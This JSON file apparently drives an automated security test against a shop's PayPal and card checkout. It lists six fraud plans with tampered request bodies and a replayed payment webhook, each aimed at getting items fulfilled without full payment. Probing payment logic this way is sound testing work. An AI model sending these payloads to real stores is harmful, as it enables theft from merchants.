{
  "plans": [
    {
      "name": "Capture-time basket inflation",
      "idea": "The capture handler may trust items sent with capture instead of the basket frozen when the PayPal order was created and approved.",
      "expect": "Pay $49.00 for one approved hoodie but have five hoodies fulfilled.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "paypalOrderId": "{{b.paypalOrderId}}",
            "shopOrderId": "{{b.shopOrderId}}",
            "orderId": "{{b.shopOrderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 5
              }
            ],
            "quantity": 5
          },
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Path/body capture swap",
      "idea": "The capture endpoint may capture the PayPal order identified in the URL while fulfilling the different shop order identified in the request body, without checking that they were created together.",
      "expect": "A $49.00 capture for one hoodie fulfils a separate unpaid three-hoodie shop order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "paypalOrderId": "{{a.body.paypalOrderId}}",
            "shopOrderId": "{{a.body.shopOrderId}}",
            "orderId": "{{a.body.shopOrderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Duplicate-line pricing split",
      "idea": "Pricing may collapse duplicate SKU lines through a map or first matching line while fulfilment iterates and sums every submitted line.",
      "expect": "Be charged for one hoodie while three identical order lines are fulfilled.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "49-yen currency confusion",
      "idea": "The shop may forward a buyer-supplied currency to PayPal or validate only the numeric amount, treating 49 JPY as though it were 49 USD.",
      "expect": "Pay ¥49 instead of $49.00 and still receive the hoodie as a paid USD order.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1,
                "unit_amount": {
                  "currency_code": "JPY",
                  "value": "49.00"
                }
              }
            ],
            "currency": "JPY",
            "currency_code": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "49.00"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "JPY",
                  "value": "49.00"
                },
                "items": [
                  {
                    "name": "Fogline Hoodie",
                    "quantity": "1",
                    "unit_amount": {
                      "currency_code": "JPY",
                      "value": "49.00"
                    }
                  }
                ]
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Transplanted capture webhook",
      "idea": "After blocking capture, a webhook handler that routes by custom_id and related order ID but does not verify that the reused capture belongs to that order—or that the edited body matches its signature—may fulfil the uncaptured order.",
      "expect": "The approved but never-captured order is fulfilled without PayPal taking any money for it.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.id": "{{legit.captureId}}",
            "resource.custom_id": "{{b.shopOrderId}}",
            "resource.supplementary_data.related_ids.order_id": "{{b.paypalOrderId}}",
            "resource.status": "COMPLETED",
            "resource.amount.currency_code": "USD",
            "resource.amount.value": "49.00"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Card-route PayPal proof graft",
      "idea": "The card checkout may honour client-supplied PayPal payment-proof or paid-status fields before charging the card, allowing the legitimately captured payment to be reused through another payment route.",
      "expect": "Receive three hoodies using the earlier $49.00 PayPal capture as supposed payment, with no successful card charge and no new PayPal capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/card",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ],
            "email": "shopper@example.com",
            "card": {
              "number": "4000000000000002",
              "exp": "12/34",
              "cvc": "123"
            },
            "paymentMethod": "paypal",
            "paypalOrderId": "{{legit.paypalOrderId}}",
            "captureId": "{{legit.captureId}}",
            "captureStatus": "COMPLETED",
            "status": "fulfilled",
            "paid": true,
            "amountPaidCents": 4900
          },
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    }
  ]
}